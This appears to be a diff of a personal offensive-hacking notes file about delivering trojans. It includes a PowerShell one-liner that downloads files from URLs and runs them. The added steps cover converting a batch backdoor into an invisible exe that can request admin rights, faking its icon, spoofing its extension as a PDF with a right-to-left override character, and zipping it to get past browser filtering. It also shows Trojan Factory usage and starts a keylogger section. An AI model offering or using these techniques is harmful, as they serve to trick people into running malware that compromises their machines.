@@ -455,6 +455,28 @@ set files='url1','url2'
 
 powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"
 ```
+* to avoid popups make an incisible of execution exe form the backdor and then from this bat script you can add an icon and spoof the extention look at [Running Evil Files Silently In The Background like Veil exe files (Convert Bat to Exe)]
+
+## Running Evil Files Silently In The Background like Veil exe files (Convert Bat to Exe)
+- https://github.com/tokyoneon/B2E/blob/master/Bat_To_Exe_Converter.zip
+	- Open the bat file
+	- Select Exe invisible format
+	- can add recuest admin privilegs when run
+	- convert > convert 
+	- select the icon option
+		- https://iconarchive.com/ (select the rigth size) (dont download the ico its low resolution download the png and use a converter)
+			- https://cloudconvert.com/png-to-ico
+			- https://hnet.com/png-to-ico/
+			
+## Spoofing File Extension from .exe to anything else (pdf, png ..etc)
+add rigt-to-left character
+go to an app characters and search left-to-rigth
+```
+fdp.exe
+to
+exe.pdf
+```
+send it in zip or firefox will remove the right-to-left character
 
 ## Trojan Factory
 - https://github.com/z00z/TrojanFactory
@@ -464,10 +486,10 @@ Installation:
     - Clone Trojan Factory: > git clone https://github.com/z00z/TrojanFactory.git
     - You're all set, navigare into TrojanFactory > cd TrojanFactory
     - Run --help for usage > python trojan_factory.py --help
-
 ```
 python trojan_factory.py -f (Front file url) -e (evil file url) -o (export path) -i (icon)
 ```
+
 ## ZLogger (keyloger)
 the keyloggers that come with 'Empire' and with 'Meterpreter' store the data on file,
 they store the data on the computer.
